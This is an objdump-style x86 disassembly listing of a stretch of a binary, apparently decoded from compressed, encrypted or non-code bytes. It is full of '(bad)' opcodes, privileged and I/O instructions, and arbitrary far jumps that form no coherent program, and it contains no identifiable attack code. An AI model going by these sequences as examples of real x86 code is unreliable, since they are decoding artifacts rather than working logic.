  41d9d0:	sub    DWORD PTR [ebx-0x37727da5],0xc491d46c
  41d9da:	add    al,0x6a
  41d9dc:	adc    eax,0xfdbf0bc3
  41d9e1:	push   es
  41d9e2:	pop    esp
  41d9e3:	sub    BYTE PTR [ecx+edi*2],bl
  41d9e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9e7:	xchg   ebp,eax
  41d9e8:	dec    edx
  41d9e9:	cli    
  41d9ea:	jecxz  0x41da21
  41d9ec:	fidivr WORD PTR [edx]
  41d9ee:	(bad)  
  41d9ef:	cmc    
  41d9f0:	push   cs
  41d9f1:	fimul  DWORD PTR [esp+edx*2]
  41d9f4:	test   DWORD PTR [eax-0x5c072c1f],edx
  41d9fa:	mov    al,0xe2
  41d9fc:	cmc    
  41d9fd:	int3   
  41d9fe:	std    
  41d9ff:	mov    ebx,0x46f11ff7
  41da04:	jae    0x41d9be
  41da06:	pop    ss
  41da07:	add    al,0x58
  41da09:	or     bh,BYTE PTR [ecx-0xe]
  41da0c:	enter  0x2620,0x27
  41da10:	mov    ecx,0xca065272
  41da15:	sub    al,0x70
  41da17:	fild   DWORD PTR [esi+0x7d5281ed]
  41da1d:	adc    DWORD PTR ds:0x5220bcf2,0x32
  41da24:	dec    eax
  41da25:	sub    DWORD PTR [eax+0x32],edx
  41da28:	inc    ebx
  41da29:	dec    ebx
  41da2a:	pop    ebp
  41da2b:	cmp    BYTE PTR [ebx],dl
  41da2d:	pop    ebx
  41da2e:	xchg   edx,eax
  41da2f:	and    edi,DWORD PTR [esi]
  41da31:	inc    esi
  41da32:	cmp    eax,0x22b
	...
  41da93:	add    BYTE PTR [eax],al
  41da95:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	jecxz  0x41dad9
  41daa4:	sub    eax,0x139c5c6
  41daa9:	add    BYTE PTR [edi],al
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    BYTE PTR [edx+0x20f27af],bh
  41dab3:	sbb    bh,BYTE PTR [edx+0x5c]
  41dab6:	push   ecx
  41dab7:	jmp    0x41db21
  41dab9:	add    BYTE PTR [esi],bh
  41dabb:	lock push esi
  41dabd:	mov    ah,0xbd
  41dac0:	je     0x41db1f
  41dac2:	retf   0xc5e0
  41dac5:	inc    edx
  41dac6:	adc    eax,0x9aeff146
  41dacb:	shr    eax,1
  41dacd:	cmp    ebx,ecx
  41dacf:	adc    dh,bh
  41dad1:	loopne 0x41daa3
  41dad3:	(bad)  
  41dad4:	(bad)  
  41dad6:	cld    
  41dad7:	sub    BYTE PTR [esp+ebx*8+0x3fb4af23],0x86
  41dadf:	loopne 0x41db18
  41dae1:	jmp    0x3e294849
  41dae6:	push   0xbbbfb3de
  41daeb:	jecxz  0x41dac2
  41daed:	cmp    al,BYTE PTR [esi]
  41daef:	xchg   ecx,eax
  41daf0:	jbe    0x41daf3
  41daf2:	repz jns 0x41dab8
  41daf5:	mov    ds:0x99eaceef,eax
  41dafa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dafb:	retf   0x61b2
  41dafe:	adc    al,0x61
  41db00:	mov    ds:0xe14fde99,eax
  41db05:	xchg   edi,eax
  41db06:	scas   al,BYTE PTR es:[edi]
  41db07:	shr    BYTE PTR [ebx],0x16
  41db0a:	je     0x41dae7
  41db0c:	push   ebx
  41db0d:	add    BYTE PTR [esi],0x4f
  41db10:	int3   
  41db11:	jp     0x41da94
  41db13:	and    al,BYTE PTR ss:[ecx]
  41db16:	test   al,0x82
  41db18:	js     0x41dafd
  41db1a:	sub    BYTE PTR [ebp+0x28307253],cl
  41db20:	push   ecx
  41db21:	imul   ebx,DWORD PTR [esi],0x79
  41db24:	mov    ebp,0x40304ef5
  41db29:	push   esp
  41db2a:	loope  0x41db8a
  41db2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db2d:	loope  0x41db0c
  41db2f:	sar    BYTE PTR [ebp+0x21],0x25
  41db33:	or     eax,0x3451937b
  41db38:	mov    bh,0x9a
  41db3a:	ret    0xf0be
  41db3d:	pop    esp
  41db3e:	aas    
  41db3f:	sbb    BYTE PTR [edi+0x1a78e43c],0x4b
  41db46:	push   DWORD PTR [ecx+edi*1]
  41db49:	add    cl,BYTE PTR [esi]
  41db4b:	xchg   ebp,eax
  41db4c:	cmc    
  41db4d:	iret   
  41db4e:	jno    0x41dba1
  41db50:	jle    0x41db7d
  41db52:	popf   
  41db53:	fwait
  41db54:	ins    DWORD PTR es:[edi],dx
  41db55:	dec    esi
  41db56:	repnz ss pusha 
  41db59:	mov    ebx,0x8f4729ae
  41db5e:	push   edi
  41db5f:	and    eax,0x2c4b2cc0
  41db64:	inc    ebp
  41db65:	imul   esp,DWORD PTR [edi],0xffffff92
  41db68:	int    0xb9
  41db6a:	fcmovnbe st,st(1)
  41db6c:	inc    esp
  41db6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db6e:	xchg   ebp,eax
  41db6f:	pop    esi
  41db70:	test   DWORD PTR [ebx-0x3d],eax
  41db73:	pop    ebx
  41db74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db75:	push   eax
  41db76:	je     0x41dbb7
  41db78:	call   0x8590:0x7f7f46e9
  41db7f:	sub    bl,BYTE PTR [ebp+0x46]
  41db82:	inc    ecx
  41db83:	inc    ebx
  41db84:	xor    BYTE PTR [eax],ah
  41db86:	stos   DWORD PTR es:[edi],eax
  41db87:	mul    BYTE PTR ds:0x7e0219fc
  41db8d:	outs   dx,DWORD PTR ds:[esi]
  41db8e:	dec    esp
  41db8f:	aam    0x81
  41db91:	jbe    0x41dc04
  41db93:	shl    DWORD PTR [eax+0x11],0x29
  41db97:	test   BYTE PTR [eax+0x33d54ebf],cl
  41db9d:	das    
  41db9e:	adc    BYTE PTR [ecx-0x14],dl
  41dba1:	shrd   DWORD PTR [edi-0x60],esi,cl
  41dba5:	push   0x11b2c2d3
  41dbaa:	shl    edi,0xc6
  41dbad:	ffreep st(7)
  41dbaf:	cmc    
  41dbb0:	cs jmp 0x41dc04
  41dbb3:	xchg   ebx,eax
  41dbb4:	cld    
	...
  41dc15:	add    BYTE PTR [edi-0x36],ch
  41dc18:	adc    eax,0xefdfb598
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	popa   
  41dc23:	daa    
  41dc24:	addr16 dec ecx
  41dc26:	int3   
  41dc27:	cmp    al,BYTE PTR [ecx]
  41dc29:	add    BYTE PTR [edi],al
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    bh,dh
  41dc2f:	pop    eax
  41dc30:	mov    DWORD PTR [esi-0x4f],ebp
  41dc33:	hlt    
  41dc34:	add    ah,bl
  41dc36:	rcr    bl,1
  41dc38:	mov    ds:0x2ff7ee28,al
  41dc3d:	push   edi
  41dc3e:	adc    BYTE PTR [eax+0x37],bl
  41dc41:	cld    
  41dc42:	adc    DWORD PTR [edx],esp
  41dc44:	(bad)  
  41dc45:	jbe    0x41dc2d
  41dc47:	ins    BYTE PTR es:[edi],dx
  41dc48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc49:	jnp    0x1c10d6a
  41dc4f:	push   edi
  41dc50:	dec    esp
  41dc51:	out    dx,eax
  41dc52:	jns    0x41dc0b
  41dc54:	mov    esi,0x106cc6bc
  41dc59:	sub    eax,0xff9d403b
  41dc5e:	adc    al,0x95
  41dc60:	xor    BYTE PTR [esi],0x74
  41dc63:	(bad)  
  41dc64:	adc    DWORD PTR gs:0x3f475947,eax
  41dc6b:	(bad)  
  41dc6c:	je     0x41dc77
  41dc6e:	lock jo 0x41dcd3
  41dc71:	int3   
  41dc72:	dec    esi
  41dc73:	mov    ecx,0x119f613c
  41dc78:	sahf   
  41dc79:	push   ebx
  41dc7a:	jb     0x41dc87
  41dc7c:	cmp    esp,0xbc4708ef
  41dc82:	inc    eax
  41dc83:	clc    
  41dc84:	push   0xb4eb4d0b
  41dc89:	sar    DWORD PTR [eax+0xb16b572],0x37
  41dc90:	push   ss
  41dc91:	cmp    BYTE PTR [esi+edx*4],ah
  41dc94:	fucom  st(1)
  41dc96:	xor    bl,BYTE PTR [ebx+0x495575bc]
  41dc9c:	sub    dl,BYTE PTR [edx+eax*8-0x7e]
  41dca0:	nop
  41dca1:	lea    ebx,[esi]
  41dca3:	fnsave [ebp-0x13badcf0]
  41dca9:	jp     0x41dd1e
  41dcab:	or     bl,BYTE PTR [ecx-0xb229f10]
  41dcb1:	jne    0x41dcb5
  41dcb3:	add    dh,ah
  41dcb5:	mov    ss,edx
  41dcb7:	sub    eax,0xed4b45f5
  41dcbc:	cmp    eax,0x245b2eac
  41dcc1:	sub    ch,BYTE PTR [edi-0x14f7ddc7]
  41dcc7:	mov    al,ds:0xd60d7c6c
  41dccc:	or     eax,0x259fae21
  41dcd1:	inc    ecx
  41dcd2:	(bad)  
  41dcd3:	jge    0x41dc58
  41dcd5:	mov    esp,0x43b186f3
  41dcda:	add    al,BYTE PTR [edi+0x7c]
  41dcdd:	nop
  41dcde:	and    ebp,DWORD PTR [ecx]
  41dce0:	sahf   
  41dce1:	push   edx
  41dce2:	ins    DWORD PTR es:[edi],dx
  41dce3:	(bad)  
  41dce4:	jmp    0x41dca4
  41dce6:	icebp  
  41dce7:	sbb    DWORD PTR [edi+ebx*8+0x574d546c],esi
  41dcee:	push   ebx
  41dcef:	sahf   
  41dcf0:	lahf   
  41dcf1:	(bad)  
  41dcf2:	ror    BYTE PTR [eax],1
  41dcf4:	fistp  DWORD PTR [ecx+0x6a]
  41dcf7:	aad    0xf2
  41dcf9:	popf   
  41dcfa:	sbb    ah,BYTE PTR [edi-0x51]
  41dcfd:	xchg   ah,al
  41dcff:	sub    eax,0xc316f6f3
  41dd04:	push   esp
  41dd05:	clc    
  41dd06:	into   
  41dd07:	aas    
  41dd08:	std    
  41dd09:	loop   0x41dd7c
  41dd0b:	ret    0x185e
  41dd0e:	(bad)  
  41dd0f:	and    BYTE PTR [ebx],bl
  41dd11:	sub    BYTE PTR [ecx],bl
  41dd13:	aaa    
  41dd14:	push   0x8
  41dd16:	mov    esi,0x7047389d
  41dd1b:	pop    ebp
  41dd1c:	gs jge 0x41dd93
  41dd1f:	xor    al,0x31
  41dd21:	sahf   
  41dd22:	fiadd  WORD PTR [ecx-0x76c82281]
  41dd28:	adc    BYTE PTR [edi+0x380994dd],bh
  41dd2e:	sbb    BYTE PTR [eax],cl
  41dd30:	add    al,0xbb
  41dd32:	ficom  WORD PTR [esi-0x45]
	...
  41dd95:	add    BYTE PTR [eax],ah
  41dd97:	repz das 
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0xe41667bb,eax
  41dda3:	jbe    0x41de0b
  41dda5:	inc    esi
  41dda6:	sar    DWORD PTR [ebx],cl
  41dda8:	add    DWORD PTR [eax],eax
  41ddaa:	pop    es
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    BYTE PTR [edx-0x7fbc6adc],ah
  41ddb3:	sub    BYTE PTR [edx-0x7b90bd32],dh
  41ddb9:	dec    eax
  41ddba:	jle    0x41dd56
  41ddbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddbd:	jp     0x41de1b
  41ddbf:	xor    eax,0x7d932e80
  41ddc4:	xor    DWORD PTR [edi],esp
  41ddc6:	ret    
  41ddc7:	sub    edx,DWORD PTR [ecx]
  41ddc9:	add    esi,DWORD PTR ds:0x997cc921
  41ddcf:	pop    edi
  41ddd0:	je     0x41ddad
  41ddd2:	xchg   edx,eax
  41ddd3:	sbb    al,0x71
  41ddd5:	mov    DWORD PTR [ebx+ebx*8-0x5071dd87],eax
  41dddc:	addr16 mov esi,0x81c16176
  41dde2:	sbb    dh,BYTE PTR [edx]
  41dde4:	repnz sbb DWORD PTR [eax-0x66],edx
  41dde8:	push   es
  41dde9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddea:	aam    0xea
  41ddec:	mov    ch,0x7c
  41ddee:	sbb    dl,dl
  41ddf0:	mov    BYTE PTR [edx+0x20],ch
  41ddf3:	and    DWORD PTR [eax],0xffffffc1
  41ddf6:	push   esi
  41ddf7:	icebp  
  41ddf8:	retf   0xa910
  41ddfb:	pop    eax
  41ddfc:	jl     0x41de16
  41ddfe:	xchg   ebx,eax
  41ddff:	mov    dl,0xf8
  41de01:	sbb    DWORD PTR [ebx+0x4e],ebp
  41de04:	mov    ebp,0x7dd0e87
  41de09:	(bad)  
  41de0a:	fucomi st,st(1)
  41de0c:	shl    BYTE PTR [ebx-0x39],cl
  41de0f:	xchg   ch,al
  41de11:	fdivr  st(5),st
  41de13:	mov    al,ds:0xbec7cdec
  41de18:	mov    ds:0xe7c14b20,al
  41de1d:	mov    bl,0xc7
  41de1f:	cmp    DWORD PTR [ecx+0x7e],0x11
  41de23:	pusha  
  41de24:	arpl   bp,bp
  41de26:	aad    0x5b
  41de28:	and    cl,BYTE PTR [eax+ebp*1+0x47]
  41de2c:	xor    dh,BYTE PTR [ebp+0x5baeb16a]
  41de32:	faddp  st(5),st
  41de34:	fbstp  TBYTE PTR [eax-0x71]
  41de37:	stos   BYTE PTR es:[edi],al
  41de38:	test   al,0xd9
  41de3a:	out    0x22,al
  41de3c:	dec    esi
  41de3d:	xor    BYTE PTR [edi-0x4f],dh
  41de40:	cmp    eax,0xe28541e9
  41de45:	cmp    ecx,0xffffffad
  41de48:	(bad)  
  41de4a:	mov    eax,0x72e2624c
  41de4f:	lods   eax,DWORD PTR ds:[esi]
  41de50:	into   
  41de51:	jnp    0x41dea0
  41de53:	imul   edi,DWORD PTR ds:0x365876d7,0x41198e8
  41de5d:	ins    BYTE PTR es:[edi],dx
  41de5e:	jbe    0x41de9c
  41de60:	jle    0x41debf
  41de62:	or     BYTE PTR [eax],0x7b
  41de65:	xor    BYTE PTR [eax+edi*4+0x211ed1d2],ch
  41de6c:	outs   dx,DWORD PTR ds:[esi]
  41de6d:	call   0xa27c:0x6f0adbc1
  41de74:	popa   
  41de75:	stc    
  41de76:	and    DWORD PTR [ebx+0x51794343],eax
  41de7c:	es mov cl,0x16
  41de7f:	pop    ebp
  41de80:	jno    0x41de69
  41de82:	aas    
  41de83:	fild   DWORD PTR ds:0x51ed84f2
  41de89:	scas   al,BYTE PTR es:[edi]
  41de8a:	jbe    0x41dea6
  41de8c:	cmp    BYTE PTR [eax+0x10c40689],dl
  41de92:	aam    0x1b
  41de94:	and    edi,ecx
  41de96:	cwde   
  41de97:	ficom  DWORD PTR [edi]
  41de99:	xor    esp,ecx
  41de9b:	fs ins DWORD PTR es:[edi],dx
  41de9d:	(bad)  
  41de9e:	mov    eax,0xc119a9f1
  41dea3:	and    al,BYTE PTR [ebp-0x55cbaffb]
  41dea9:	jecxz  0x41df23
  41deab:	push   edi
  41deac:	sub    DWORD PTR [edx-0x9],0x33
  41deb0:	xlat   BYTE PTR ds:[ebx]
  41deb1:	das    
  41deb2:	jl     0x41df31
  41deb4:	inc    DWORD PTR [eax]
	...
  41df16:	aas    
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0x21e2c191
  41df24:	xor    cl,dh
  41df26:	fidivr DWORD PTR [ecx+eax*1]
  41df29:	add    BYTE PTR [edi],al
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    BYTE PTR [esi-0x5143beb1],cl
  41df33:	jecxz  0x41df90
  41df35:	(bad)  
  41df36:	jne    0x41df63
  41df38:	cld    
  41df39:	push   ds
  41df3a:	(bad)  
  41df3b:	aad    0x7a
  41df3d:	hlt    
  41df3e:	cmp    ecx,ecx
  41df40:	push   ds
  41df41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df42:	push   ecx
  41df43:	cs jle 0x41df1a
  41df46:	adc    DWORD PTR [ebx+0x39],edx
  41df49:	in     al,0xdb
  41df4b:	clc    
  41df4c:	sub    eax,0xa1f411
  41df51:	imul   edi,DWORD PTR [ebx],0x4aba1400
  41df57:	sub    DWORD PTR [edx+eax*8],ecx
  41df5a:	push   ds
  41df5b:	iret   
  41df5c:	xor    eax,0x5348a1e8
  41df61:	mov    BYTE PTR [eax-0x2f],cl
  41df64:	call   0x5c3e:0xd952687e
  41df6b:	jbe    0x41dfb4
  41df6d:	adc    al,BYTE PTR [ebx-0x1e00f1f4]
  41df73:	jecxz  0x41df06
  41df75:	aas    
  41df76:	jno    0x41dfbd
  41df78:	cdq    
  41df79:	cmp    al,0x66
  41df7b:	jno    0x41dfeb
  41df7d:	addr16 (bad) 
  41df7f:	cli    
  41df80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df81:	mov    dl,0xf
  41df83:	xor    DWORD PTR [edx-0x42],edi
  41df86:	outs   dx,DWORD PTR ds:[esi]
  41df87:	popa   
  41df88:	aad    0x9b
  41df8a:	mov    bl,0xab
  41df8c:	mov    bl,0x91
  41df8e:	jne    0x41df58
  41df90:	mov    ecx,0x52891372
  41df95:	jo     0x41dfd1
  41df97:	outs   dx,DWORD PTR ds:[esi]
  41df98:	push   cs
  41df99:	test   DWORD PTR [esi+0x37c27852],ebx
  41df9f:	std    
  41dfa0:	jnp    0x41df8b
  41dfa2:	pusha  
  41dfa3:	popa   
  41dfa4:	and    al,0x31
  41dfa6:	pushf  
  41dfa7:	mov    ah,0x94
  41dfa9:	scas   al,BYTE PTR es:[edi]
  41dfaa:	imul   edx,DWORD PTR fs:[edx],0x41
  41dfae:	(bad)  
  41dfaf:	jmp    0x13:0xa7e01e0c
  41dfb6:	test   al,0x9a
  41dfb8:	out    dx,al
  41dfb9:	rcr    DWORD PTR [edx+0x6734d5a4],0xa
  41dfc0:	add    al,0xcc
  41dfc2:	fbld   TBYTE PTR ds:[edi+0x43]
  41dfc6:	leave  
  41dfc7:	or     DWORD PTR ds:0x6137162,ecx
  41dfcd:	arpl   ax,si
  41dfcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfd0:	jmp    0xa8b833d7
  41dfd5:	jnp    0x41e004
  41dfd7:	inc    ebx
  41dfd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfd9:	test   eax,0x5906a0ed
  41dfde:	int3   
  41dfdf:	or     edx,DWORD PTR [edi]
  41dfe1:	sar    BYTE PTR [esi],0xbf
  41dfe4:	fidiv  DWORD PTR [ebx+0x0]
  41dfe7:	scas   al,BYTE PTR es:[edi]
  41dfe8:	js     0x41e037
  41dfea:	add    eax,0xa236745
  41dfef:	inc    edi
  41dff0:	mov    ah,BYTE PTR [esp+esi*2+0x79337aaf]
  41dff7:	test   DWORD PTR [eax+0x69],edx
  41dffa:	mov    dl,0x16
  41dffc:	retf   
  41dffd:	or     al,0x62
  41dfff:	std    
  41e000:	push   ss
  41e001:	dec    esi
  41e002:	sbb    bh,BYTE PTR [esi]
  41e004:	fiadd  DWORD PTR [edi+0x1a]
  41e007:	xchg   esi,eax
  41e008:	imul   ebp,ebp,0x2fbfdb2e
  41e00e:	les    edi,FWORD PTR [ecx]
  41e010:	adc    edi,ebx
  41e012:	mov    ecx,0x9ffbfb24
  41e017:	int    0xee
  41e019:	sub    ch,BYTE PTR [ebx-0x51]
  41e01c:	scas   eax,DWORD PTR es:[edi]
  41e01d:	inc    ebp
  41e01e:	mov    ds,WORD PTR [edx-0x53]
  41e021:	add    ebp,DWORD PTR [ebx+0x72]
  41e024:	pop    es
  41e025:	out    0x86,eax
  41e027:	cmp    DWORD PTR [edx+0x1737aea7],edx
  41e02d:	add    ah,ah
  41e02f:	fwait
  41e030:	push   esp
  41e031:	fnstsw WORD PTR [edi+0x8fbd]
	...
  41e093:	add    BYTE PTR [eax],al
  41e095:	add    BYTE PTR [edi+0x53],cl
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	jno    0x41e081
  41e0a4:	retf   0xe16c
  41e0a7:	cmp    eax,0x1070001
  41e0ac:	add    BYTE PTR [eax],al
  41e0ae:	dec    edx
  41e0af:	jo     0x41e0cb
  41e0b1:	retf   0xe187
  41e0b4:	adc    bh,ah
  41e0b6:	xchg   ecx,eax
  41e0b7:	rol    BYTE PTR [edi],cl
  41e0b9:	add    eax,0xd6e03590
  41e0be:	add    DWORD PTR ds:0x5a58d1da,ecx
  41e0c4:	test   al,0xcc
  41e0c6:	jmp    DWORD PTR [edi+edx*1-0x7a]
  41e0ca:	xchg   edi,eax
  41e0cb:	push   es
  41e0cc:	fwait
  41e0cd:	(bad)  
  41e0ce:	fistp  QWORD PTR [edi+0x5b]
  41e0d1:	push   ss
  41e0d2:	out    0x38,eax
  41e0d4:	xlat   BYTE PTR ds:[ebx]
  41e0d5:	adc    DWORD PTR [edi-0x12e5d1fb],edx
  41e0db:	and    edx,DWORD PTR [ebp-0x6e6d5baa]
  41e0e1:	push   0xffffffdc
  41e0e3:	adc    ah,cl
  41e0e5:	dec    ecx
  41e0e6:	adc    BYTE PTR [edx],ch
  41e0e8:	cmp    al,0xca
  41e0ea:	pop    esi
  41e0eb:	cld    
  41e0ec:	push   esp
  41e0ed:	repz iret 
  41e0ef:	cmp    BYTE PTR ds:0xafd1e637,bl
  41e0f5:	imul   edx,DWORD PTR [ecx+eax*8+0x57],0x14
  41e0fa:	loope  0x41e0ad
  41e0fc:	mov    al,ds:0xfcce669b
  41e101:	out    0xb9,eax
  41e103:	xor    eax,0x5b493a15
  41e108:	sbb    BYTE PTR [ebx],dl
  41e10a:	cmp    BYTE PTR [esi],dl
  41e10c:	lock jne 0x41e12b
  41e10f:	dec    ebx
  41e110:	add    bh,BYTE PTR [esi]
  41e112:	mov    bl,0x36
  41e114:	fidiv  DWORD PTR [esi]
  41e116:	push   0x53
  41e118:	and    eax,0xa287f6b7
  41e11d:	ret    0x4c7f
  41e120:	aad    0xdf
  41e122:	pop    ecx
  41e124:	inc    edi
  41e125:	push   edi
  41e126:	mov    bh,0x6c
  41e128:	repnz std 
  41e12a:	bound  esp,QWORD PTR [ebx+0x2efa419e]
  41e130:	mov    edx,0x2286f694
  41e135:	jp     0x41e13f
  41e137:	mov    dh,0xe6
  41e139:	sub    esp,edx
  41e13b:	fiadd  WORD PTR [ecx-0x12]
  41e13e:	fmul   DWORD PTR ds:0x8367c291
  41e144:	dec    ebp
  41e145:	xchg   BYTE PTR [esi+0x5e],al
  41e148:	ss daa 
  41e14a:	lods   al,BYTE PTR ds:[esi]
  41e14b:	jp     0x41e1aa
  41e14d:	push   0xffffff84
  41e14f:	jge    0x41e1aa
  41e151:	cmp    ebp,esi
  41e153:	daa    
  41e154:	hlt    
  41e155:	aam    0xf5
  41e157:	(bad)  
  41e158:	cmp    al,0x38
  41e15a:	lds    ebp,FWORD PTR ds:0xa087000b
  41e160:	adc    al,0x6d
  41e162:	and    esi,DWORD PTR [eax+0x699c1ff4]
  41e168:	out    0x8c,al
  41e16a:	sbb    eax,0x8c9af28
  41e16f:	jno    0x41e1ec
  41e171:	pop    ecx
  41e172:	scas   al,BYTE PTR es:[edi]
  41e173:	push   edx
  41e174:	adc    eax,0xa88c5ef7
  41e179:	lahf   
  41e17a:	mov    ebx,0x853b7a85
  41e17f:	push   edi
  41e180:	fst    DWORD PTR [edi-0x3e]
  41e183:	mov    al,0xc0
  41e185:	jle    0x41e155
  41e187:	lods   eax,DWORD PTR ds:[esi]
  41e188:	mov    gs,WORD PTR [ebx]
  41e18a:	mov    ecx,0x1ff8b78d
  41e18f:	ss lock inc eax
  41e192:	push   ds
  41e193:	repnz sahf 
  41e195:	jne    0x41e13b
  41e197:	fdiv   DWORD PTR [esi+0x10]
  41e19a:	je     0x41e157
  41e19c:	in     eax,dx
  41e19d:	lods   al,BYTE PTR ds:[esi]
  41e19e:	xchg   ecx,eax
  41e19f:	fcomp  QWORD PTR [edx-0xf6fc38e]
  41e1a5:	xchg   esi,eax
  41e1a6:	xchg   ebx,eax
  41e1a7:	mov    ecx,0x5a220610
  41e1ac:	and    DWORD PTR [ebp+0x7f],0xffffff99
  41e1b0:	sub    ah,BYTE PTR [ecx+0x3a]
  41e1b3:	push   0x3b
	...
  41e214:	add    BYTE PTR [eax],al
  41e216:	stos   DWORD PTR es:[edi],eax
  41e217:	add    dh,BYTE PTR [edi-0x1a]
  41e21a:	push   edi
  41e21c:	mov    ebx,0xf08a4a4f
  41e221:	mov    ebx,DWORD PTR [edx-0x77]
  41e224:	inc    eax
  41e225:	mov    ds:0x13ee8,al
  41e22a:	pop    es
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [ecx-0x6d740673],bl
  41e233:	xor    eax,0xf6878cb1
  41e238:	aad    0xd1
  41e23a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e23b:	or     eax,0xc0cf12d4
  41e240:	sbb    BYTE PTR [esi-0x7d],0x31
  41e244:	adc    BYTE PTR [edi],ch
  41e246:	xchg   esi,eax
  41e247:	fwait
  41e248:	loop   0x41e229
  41e24a:	xchg   edx,eax
  41e24b:	xchg   dl,bl
  41e24d:	ret    0x4264
  41e250:	or     dh,BYTE PTR [ebx-0x6f]
  41e253:	out    0x9e,eax
  41e255:	enter  0x4c92,0x5
  41e259:	or     DWORD PTR [edi],edi
  41e25b:	sbb    eax,0xee7af65a
  41e260:	adc    DWORD PTR [edx+0x2ebd72c1],edi
  41e266:	dec    DWORD PTR [edi+0x7c56e815]
  41e26c:	clc    
  41e26d:	dec    ebp
  41e26e:	js     0x41e2c5
  41e270:	push   ecx
  41e271:	repz dec edi
  41e273:	sbb    eax,0xe2bce73
  41e278:	xchg   esp,eax
  41e279:	pushf  
  41e27a:	sbb    dl,ah
  41e27c:	pop    edx
  41e27d:	push   0xa33c0101
  41e282:	fisub  DWORD PTR [esi+0x69]
  41e285:	dec    eax
  41e286:	push   edx
  41e287:	xchg   edi,eax
  41e288:	scas   al,BYTE PTR es:[edi]
  41e289:	pop    eax
  41e28a:	cmp    eax,0x30d70a7f
  41e28f:	cmp    BYTE PTR [edx],dl
  41e291:	and    BYTE PTR [ecx+0x16743ec2],bh
  41e297:	and    DWORD PTR [edi],edx
  41e299:	test   eax,0xe34a9dd2
  41e29e:	push   ecx
  41e29f:	repz inc ebp
  41e2a1:	add    al,0xd8
  41e2a3:	jmp    0x22daf6f0
  41e2a8:	outs   dx,BYTE PTR ds:[esi]
  41e2a9:	sbb    ch,BYTE PTR [esi+0x11]
  41e2ac:	push   ecx
  41e2ad:	sbb    edx,DWORD PTR [eax-0x5a]
  41e2b0:	cmp    DWORD PTR [ebx],ebx
  41e2b2:	push   ebx
  41e2b3:	add    eax,0x7cfb9ce4
  41e2b8:	mov    cl,0xd8
  41e2ba:	pop    ecx
  41e2bb:	ins    BYTE PTR es:[edi],dx
  41e2bc:	scas   al,BYTE PTR es:[edi]
  41e2bd:	int    0xd0
  41e2bf:	dec    edx
  41e2c0:	ror    BYTE PTR [ebp+0x4e],0x94
  41e2c4:	rcr    DWORD PTR [ebx+ecx*8+0x7076c397],1
  41e2cb:	mov    bh,0x2b
  41e2cd:	cmp    ch,BYTE PTR [edx+0xe6dbbe7]
  41e2d3:	pop    edx
  41e2d4:	push   0xffffff9a
  41e2d6:	and    eax,0xcf47fe7
  41e2db:	jg     0x41e2c3
  41e2dd:	cmp    eax,0x220eafc5
  41e2e2:	mov    dl,0x8d
  41e2e4:	aaa    
  41e2e5:	in     eax,0xdb
  41e2e7:	das    
  41e2e8:	add    DWORD PTR [ecx+0x55],ebp
  41e2eb:	arpl   dx,ax
  41e2ed:	aam    0x83
  41e2ef:	(bad)  
  41e2f0:	hlt    
  41e2f1:	(bad)  
  41e2f2:	clc    
  41e2f3:	push   cs
  41e2f4:	xchg   dh,dl
  41e2f6:	sub    bh,BYTE PTR ds:0x7fe81437
  41e2fc:	test   BYTE PTR [ebp+0x70a11e0],dh
  41e302:	cmp    DWORD PTR [ebx],ebp
  41e304:	ins    DWORD PTR es:[edi],dx
  41e305:	mov    ah,0x20
  41e307:	cmp    DWORD PTR [eax],ecx
  41e309:	sub    BYTE PTR [edi-0x7f],cl
  41e30c:	mov    bh,cl
  41e30e:	add    BYTE PTR [edx-0x45],bl
  41e311:	cs xchg edi,eax
  41e313:	call   0x919b7320
  41e318:	mov    dh,0xdf
  41e31a:	mov    dl,0x92
  41e31c:	in     eax,dx
  41e31d:	cld    
  41e31e:	cmp    dl,BYTE PTR [edi-0x2bf07cc7]
  41e324:	loope  0x41e2bb
  41e326:	inc    edi
  41e327:	clc    
  41e328:	dec    ebp
  41e329:	adc    eax,0x7b6838cf
  41e32e:	lods   eax,DWORD PTR ds:[esi]
  41e32f:	cmp    al,0xbb
  41e331:	fwait
  41e332:	scas   eax,DWORD PTR es:[edi]
  41e333:	xor    eax,0x6
	...
  41e394:	add    BYTE PTR [eax],al
  41e396:	mov    DWORD PTR [edx],edx
  41e398:	ja     0x41e3b9
  41e39a:	(bad)  
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0x4e204855
  41e3a3:	mov    ch,0xc6
  41e3a5:	xchg   edx,eax
  41e3a6:	out    dx,eax
  41e3a7:	aas    
  41e3a8:	add    DWORD PTR [eax],eax
  41e3aa:	pop    es
  41e3ab:	add    DWORD PTR [eax],eax
